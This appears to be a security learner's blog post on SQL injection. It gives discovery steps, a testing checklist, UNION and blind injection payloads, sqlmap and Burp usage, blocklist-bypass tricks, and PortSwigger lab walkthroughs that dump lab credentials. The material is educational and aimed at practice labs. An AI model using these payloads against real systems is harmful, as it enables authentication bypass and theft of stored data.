---
layout: post
title: SQLi
subtitle: Insert SQL query to bypass authentication and retrieve data from the database 
date: 2025-07-30 09:59
author: Ren Sie
comments: true
category: injection
thumbnail-img: /assets/img/githubpost/sqli_thumb.png
share-img: /assets/img/Post_Cover.png
---

Refer: [OWasp A03:2021](https://owasp.org/Top10/A03_2021-Injection/)

- **How**: Start off adding  single/double quote to break the structure and study the responses. If vulnerable, append query to retrieve information.  
- Type: Classic, UNION, Blind, Time-based

### SQLi Vulnerability Discovery

{: .box-note}
**Note:** üí≠ When determining SQLi, think of **everything you send to the application, how it may be used**?

Database: Select user from users where username = "User_Input" or 'User_Input'  
Visit [SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

1. Single of double quote. Try to break the design.  
   E.g., `bob'` or `bob"`
2. Logical query: `or 1=1`  
   E.g., `bob' or 1=1`, `bob' or '1=1`, `bob" or "1=1`
3. Comment : `#` `--` `-`, everything after it will be ignored.  
   E.g., `bob' or '1=1#` `bob' or '1=1-- -` `bob" or "1=1#` `bob" or "1=1-- -`

### Checklist
<details markdown="1">
  <summary>Click me to expand checklist</summary>  

1. **What is the technology stack you're attacking?**
   - Frontend technologies (e.g., React, Angular)
   - Backend frameworks and languages (e.g., Node.js, Django)
   - Web server (e.g., Apache, Nginx)
   - Database (SQL or NoSQL)
   - Is there an ORM?
   - Other middleware, caching, cloud services, and tools that make up the full system

2. **Verify injection points**
   - URL parameters (e.g., https[://]example.com/user?userid=2 OR 1=1)
   - Form fields (e.g., login forms or search boxes)
   - HTTP headers (e.g., cookies, user-agent, authorization token, X-Forwarded-For, etc.)
   - Out-of-band (e.g. data retrieved from a third party)

3. **Test `'` and `"`**
   - Can you trigger an error?
   - Can you trigger a different response? (e.g.,  "_Internal Server Error_" rather than "_No Results Found_")

4. **Test with SQLmap**
5. **Test for login bypass `' and 1=1-- -` etc**
6. **Test for blind SQLi**
   - Test for errors
   - Test for conditional responses
     ```
     TrackingId=xyz' AND '1'='1 # condition is true
     TrackingId=xyz' AND '1'='2 # condition is false
     ```
   - Test for conditional errors
     ```
     xyz' AND (SELECT CASE WHEN (SUBSTRING(Password,1,1) > 'm') THEN 1/0 ELSE 'a' END FROM Users WHERE Username='Administrator')='a
     # Error appears: The letter is after "m".
     # No error: It‚Äôs "m" or earlier.
     ```
   - Test for time delays

7. **Test for out-of-band interactions**
8. **Test for NoSQL injection**
9. **Is there a blocklist?**
   - a list of disallowed characters, keywords, or patterns

10. **Can we bypass the blocklist?**
   - Encoding (e.g., URL encoding, Unicode)  
   - Double encoding
   - Alternative characters
   - Alternative payloads (e.g., `OR 0x50=0x50` instead of `OR 1=1`)

11. Test for second-order SQLi
   - Inject a payload into the application input for storage
   - trigger usage of stored data in a query

</details>

### SQLi Union
It appends an additional SQL query after the original, legitimate one.

{: .box-note}
**Note:** ‚ö†Ô∏èUNION SELECT: Determine the available column number can be returned first. Keep adding `,NULL` values until the query returns results properly.
SQL: bob' union select `null`#

In the first example, the database contains **3 columns** that contains text. But it only gives us two output `bob` and `null`.

![The example has 3 columns available.](https://rencybersec.github.io/assets/img/githubpost/sqli_3.png){: .mx-auto.d-block :}  

1. Table
~~~
UNION SELECT table_name from information_schema.tables#
~~~
2. Column
~~~
UNION SELECT column_name from information_schema.columns#
~~~
3. Retrieve Data
~~~
UNION SELECT username from <Table>
~~~

#### Version Query
Insert version query make it return at the 3rd column. Which tells us the version of the SQL database is 8.0.43.
   ~~~
   SQL: bob' union select null,null,version()#
   ~~~
   > Return:  
   > Username: bob - Email: bob@example.com  
   > Username: Email: 8.0.43  
    
#### Available_Table Query
Use `table_name from information_schema.tables` to retrieve all available table name from the DB.
   ~~~
   SQL: bob' union select null,null,table_name from information_schema.tables#
   ~~~
   > Return:
   > Username: bob - Email: bob@example.com  
   > Username: - Email: CHARACTER_SETS  
   >               .  
   >               .  
   >               .  
   > Username: - Email: injection0x03_products  
   > Username: - Email: injection0x03_users  
   > Username: - Email: xss0x02  
    
#### Available_Column Query
Use `column_name from information_schema.columns` to retrieve all available column names from the DB.
   ~~~
   SQL: bob' union select null,null,column_name from information_schema.columns#
   ~~~
   > Username: bob - Email: bob@example.com  
   > Username: - Email: username  
   > Username: - Email: password  
   > Username: - Email: email  

#### Retrieve Password Query
Since we discover there‚Äôs password in our current table injection0x01. use select password from injection0x01.
   ~~~
   SQL: jeremy' union select password from injection0x01,null,null#
   ~~~    
   > Username: jeremy - Email: jeremy@example.com  
   > Username: - Email: jeremyspassword  
   > Username: - Email: jessamyspassword  
   > Username: - Email: bobspassword  
    
{: .box-note}
**Note:** ‚ö†Ô∏è If 1st column doesn‚Äôt work, try insert query in 2nd column. If it still not working, try 3rd column, and so on.  

### SQLi Blind
when **Web application doesn‚Äôt return any error messages or data from DB**. We need to look for **subtle differences** in the server's response, which can reveal whether the input field is vulnerable to SQL injection.  
E.g., Response Content-Length

{: .box-note}
**Note:** üö® If it **return the same response as the original request**, it means the input is vulnerable to SQLi.

After determine the vulnerability to SLQi Blind, we use _YES/NO_ approach to extract data.  
E.g., Is user 'Admin' existed in DB? YES/NO?

#### Burp Suite Proxy
Using Burp Proxy intercept `POST /labs/i0x02.php` request that contains login payload `username=jeremy&password=jeremy`.  
Copy and paste the entire body to .txt file, we will use SQLMAP to identify injectable input area.
   ~~~
   POST /labs/i0x02.php HTTP/1.1
   Host: localhost
   Content-Length: 31
   Cache-Control: max-age=0
   Origin: [http://localhost](http://localhost/)
   Content-Type: application/x-www-form-urlencoded
   User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
   Connection: keep-alive
   username=jeremy&password=jeremy
   ~~~

#### Identify SQL injectable by SQLMap
Run the application against target HTTP request, it will analyze and tell us which input is vulnerable to SQLi. 
   ~~~
   $ sudo sqlmap -r <Path_to_Target_File>
   ~~~
The result suggest all the input in the page aren‚Äôt injectable.
   > [12:28:49] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
   > [12:29:06] [WARNING] POST parameter 'username' does not seem to be injectable  
   > [12:29:06] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable  
   > [12:29:07] [WARNING] POST parameter 'password' does not seem to be injectable  
   > [12:29:07] [CRITICAL] all tested parameters do not appear to be injectable.
  
After learning the 1st request we captured isn‚Äôt valuable, we move on to the next request `GET /labs/i0x02.php` which contains our session cookie in the body.
   ~~~
   Cookie: session=6967cabefd763ac1a1a88e11159957db
   Response: Content-Length: 1027
   ~~~

Insert quote to test if we can break the structure, which gives us the same Content-Length in response.
   ~~~
   Cokie: session=6967cabefd763ac1a1a88e11159957db' and 1=1#
   Response: Content-Length: 1027
   ~~~

#### Substr()
~~~
Syntax: substr(string,start,length)
E.g., `substr("SQL Test",5,3)`  
 # Extract a substring from a string, and start at position 5, extract 3 characters.
~~~

In our case, if we send `Cookie: session=<cookie>' and substring('a',1,1) = 'a'#` which will return normal Content-Length. That‚Äôs because the string the 1st character from position 1 is equal to 'a'.  
So we‚Äôd like to compare the provide character with the data in the DB.

##### Version Testing
1. Send `Cookie: session=<cookie>' and substring((version()),1,1) = '8'#` which return normal Content-Length (1027).  
 # That indicates the version start with 8.
2. After testing each number of the version one by one. we retrieve the SQL version with `Cookie: session=<cookie>' and substring((version()),1,5) = '8.0.4'#` that return normal Content-Length (1027)  

#### Burp Suite Intruder

Since password can be long and complex, we can utilize the Burp Intruder perform the automatic task.
1. Send the request to intruder
   ~~~
   Cookie: session=<cookie>' and substring((select password from injection0x02 where username = 'jeremy'),1,1) = 'payload'#`
   ~~~
2. Use all Alphanumeric character as payload  
![Burp Intruder Payload](https://rencybersec.github.io/assets/img/githubpost/sqli_1.png){: .mx-auto.d-block :}  

3. Determine the correct character by studying the Content-Length  
![Use "Welcome" and Length to determine the success in this case!](https://rencybersec.github.io/assets/img/githubpost/sqli_2.png){: .mx-auto.d-block :}  

#### SQL Map
~~~
- $ python3 sqlmap.py -r <Path_to_Target_File> --level=2  
 # --level=2 meant for cookie parameter injection.  
- $ python3 sqlmap.py -r <Path_to_Target_File> -T <Table_name> --dump
~~~

### Lab
Just for demostration, I completed some labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#sql-injection) to show how this vulnerability can lead to:

#### 1. SQLi vulnerability in WHERE clause allowing retrieval of hidden data 
Perform a SQL injection that causes the application to display one or more unreleased products.
   ~~~
   URL: https://vulnerable.net/filter?category=' OR 1=1-- 
   Query: SELECT * FROM products WHERE category = '' OR 1=-1 -- AND released = 1 
   ~~~

#### 2. SQLi vulnerability allowing login bypass
Perform a SQLi that logs in to the web application as the administrator.  
I receive "Internal Server Error" after submitting a single quote `'` in username field, which I can determine the application is vulnerable to the injection with single quote `'`.  
Then I tried commenting out the rest of the syntax by adding `--`, which allows me to bypass the password requirement.
   ~~~
   Username: administrator' --
   Query: SELECT firstname FROM users WHERE username='administrator' --' and password=''
   ~~~

#### 3. Querying the database type and version on Oracle
Use SQL UNION SELECT to retrieve the Database version from an injected query.  
<details markdown="1">
  <summary>Click me to expand the steps</summary> 
   
1. To perform UNION SELECT, first to determine how many available columns are in the table. I use `' order by` to learn there are two columns available.
   ~~~
   /filter?category=Accessories'+order+by+1-- # No error
   /filter?category=Accessories'+order+by+2-- # No error
   /filter?category=Accessories'+order+by+3-- # Receive Internal Server Error
   ~~~

2. Next, to determine the data type, I insert string into both columns. Since I learn that this is Oracle database, we need to include a FROM clause into the syntax. We can use [dual table](https://docs.oracle.com/en/database/oracle/oracle-database/18/sqlrf/Selecting-from-the-DUAL-Table.html).  
The result tells me that both columns contains string.
   ~~~
   /filter?category=Accessories'+union+select+'a','a'+from+dual --
   Response: Column_1: a. Column_2: a
   ~~~

3. Lastly, refer to [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for syntax to query the DB's version.
   ~~~
   /filter?category=Accessories'+union+select+banner,null+from+v$version --
   Response:
   CORE 11.2.0.2.0 Production
   NLSRTL Version 11.2.0.2.0 - Production
   Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
   PL/SQL Release 11.2.0.2.0 - Production
   TNS for Linux: Version 11.2.0.2.0 - Production
   ~~~

</details>
-


#### 4. Querying the database type and version on MySQL and Microsoft
I use SQL UNION SELECT to retrieve the Database version from an injected query.  
<details markdown="1">
  <summary>Click me to expand the steps</summary>  
1. I try insert `/filter?category='+order+by+2--` in the url which doesn't work. And `/filter?category='+order+by+2%23` works, it indicates the table contains two columns.

2. To determine which column contains text. And the response tells me both contains text.
   ~~~
   /filter?category='+union+select+'a','a'%23
   Response: Column_1: a. Column_2: a
   ~~~

3. Lastly, refer to [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for syntax to query the DB's version.
   ~~~
   /filter?category=%27+UNION+SELECT+@@version,null%23
   Response: 8.0.42-0ubuntu0.20.04.1
   ~~~

</details>
-

#### 5. listing the database contents on non-Oracle databases
In this instance, I use SQL UNION SELECT retrieve data from other tables  
<details markdown="1">
  <summary>Click me to expand the steps</summary>  
1. Insert `'+order+by+2--` to confirm there are two columns in the table.

2. To determine which column contains text. And the response tells me both contains text.
   ~~~
   /filter?category='+union+select+'a','a'--
   Response: Column_1: a. Column_2: a
   ~~~

3. Since I only know the DB is non-Oracle, I use [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) to find the syntax for DB version query.  
After a couple of tries, I know it is PostgreSQL
   ~~~
   /filter?category='+union+select+version( ),null--
   Response: PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
   ~~~

4. After knowing the DB version, refer to [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) and [PostgresSQL: Documentation](https://www.postgresql.org/docs/current/infoschema-columns.html#INFOSCHEMA-COLUMNS) to query all available tables in the DB.
   ~~~
   /filter?category='+union+select+table_name,null+from+information_schema.tables--
   Response:
   schemata
   users_vruilz
   products
   ~~~

5. After learning the table name is 'users_vruilz', I refer to [PostgresSQL: Documentation](https://www.postgresql.org/docs/current/infoschema-columns.html#INFOSCHEMA-COLUMNS) again for the available columns in the table.
   ~~~
   /filter?category='+union+select+column_name,null+from+information_schema.columns+where+table_name='users_vruilz'--
   Response:
   username_yoxkoo
   password_ashqbx
   ~~~

6. Lastly, query both username and password columns for the credentials.
   ~~~
   /filter?category='+union+select+username_yoxkoo,password_ashqbx+from+users_vruilz--
   Response:
   administrator
   nuyt5n8chfwzc4timp80
   wiener
   y2ah94mrtx1gfwdofhxz
   ~~~

</details>
-

#### 6. listing the database contents on Oracle
In this instance, I use SQL UNION SELECT retrieve data from other tables  
<details markdown="1">
  <summary>Click me to expand the steps</summary>  
1. Insert `'+order+by+2--` to confirm there are two columns in the table.

2. To determine which column contains text. And the response tells me both contains text.
   ~~~
   /filter?category='+union+select+'a','a'+from+dual--
   Response: Column_1: a. Column_2: a
   ~~~

3. Since I already knew the DB is Oracle, I refer to [Turtorialspoint-How to List All Tables in a Schema in Oracle Database?](https://www.tutorialspoint.com/how-to-list-all-tables-in-a-schema-in-oracle-database) and [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for Oracle SQL syntax to retrieve all available tables, columns, and columns contents.
   ~~~
   /filter?category='+UNION+SELECT+table_name,null+FROM+all_tables--
   Response:
   TABLE_PRIVILEGE_MAP
   USERS_TLWTXR
   ~~~

4. After know which table to look into, I need to learn what columns are in there.
   ~~~
   /filter?category='+UNION+SELECT+column_name,null+FROM+all_tab_columns+WHERE+table_name='USERS_TLWTXR'--
   Response:
   USERNAME_OSZZUR
   PASSWORD_ABETVL
   ~~~

5. Lastly, find out the content of username and password column
   ~~~
   /filter?category='%27+UNION+SELECT+USERNAME_OSZZUR,PASSWORD_ABETVL+FROM+USERS_TLWTXR--
   Response:
   administrator
   2oajo9huvzn5t1ut2qya
   carlos
   iyodof6y47bboc096xq2
   ~~~

</details>
-
